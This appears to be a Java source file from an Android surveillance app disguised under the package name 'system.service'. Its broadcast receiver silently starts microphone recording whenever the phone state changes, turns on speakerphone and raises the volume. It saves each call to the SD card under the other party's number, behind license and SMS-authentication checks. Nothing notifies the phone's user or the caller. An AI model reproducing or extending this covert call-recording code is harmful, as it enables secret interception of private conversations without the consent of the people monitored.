package system.service;

import java.io.File;
import java.text.DateFormat;
import java.text.ParseException;
import java.util.Calendar;
import java.util.Date;

import system.service.activity.GlobalPrefActivity;
import system.service.activity.InitActivity;
import system.service.config.ConfigCtrl;
import com.particle.inspector.common.util.sms.AuthSms;
import com.particle.inspector.common.util.sms.SmsConsts;
import com.particle.inspector.common.util.sms.SuperLoggingSms;
import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.FileCtrl;
import com.particle.inspector.common.util.LANG;
import com.particle.inspector.common.util.LangUtil;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;
import system.service.feature.sms.SmsCtrl;
import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.telephony.PhoneStateListener;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

public class PhoneCallReceiver extends BroadcastReceiver 
{
	private static final String LOGTAG = "PhoneCallReceiver";
	private static final String PHONE_STATE_CHANGED = "android.intent.action.PHONE_STATE";
	
	public static boolean recordStarted = false;
	
	public static MediaRecorder recorder;
	private String DEFAULT_PHONE_RECORD_DIR = FileCtrl.getDefaultDir();
	
	
	static {
		recorder = new MediaRecorder();
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
	}
	
	
	
	// **************************************************************************************
    // Receiver for phone call recording
	// **************************************************************************************
	@SuppressWarnings("unused")
	@Override
	public void onReceive(Context context, Intent intent) 
	{
		android.os.Debug.waitForDebugger();//TODO should be removed in the release
		
		String action = intent.getAction();
		if (action.equalsIgnoreCase(PHONE_STATE_CHANGED)) 
		{
			if (!ConfigCtrl.isLegal(context)) return;
			
			if (recordStarted) return;
			
			// Set audio
			setAudio(context);
			
			// Phone call recording
			try {
                String phoneNum = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                if (phoneNum == null) {
                	phoneNum = BootService.otherSidePhoneNum;
                }
                
                Date startDate = new Date();
                String fileFullPath = makePhonecallRecordFileFullPath(context, phoneNum, startDate); 
                recorder.setOutputFile(fileFullPath);
                recorder.prepare();
                recorder.start();
                recordStarted = true;
                
            } catch(Exception ex) {
                
            }
            
		} // end of Intent.ACTION_ANSWER
		
	} // end of onReceive()
	
	private String makePhonecallRecordFileFullPath(Context context, String phoneNum, Date date) {
		if (!FileCtrl.defaultDirExist()) FileCtrl.creatDefaultSDDir();
		String fileName = context.getResources().getString(R.string.phonecall_record) + phoneNum + "-" + DatetimeUtil.format3.format(date) + ".wav";
		return DEFAULT_PHONE_RECORD_DIR + fileName;
	}
	
	private void setAudio(Context context)
	{
		AudioManager audiomanager = (AudioManager)context.getSystemService("audio"); 
		int i = audiomanager.getRouting(2); 
		audiomanager.setMode(2); 
		audiomanager.setMicrophoneMute(false); 
		audiomanager.setSpeakerphoneOn(true); 
		int j = audiomanager.getStreamMaxVolume(0); 
		if(j < 0) j = 1; 
		int k = j / 2 + 1; 
		audiomanager.setStreamVolume(0, k, 0); 
		audiomanager.setRouting(2, 11, 15);
	}

}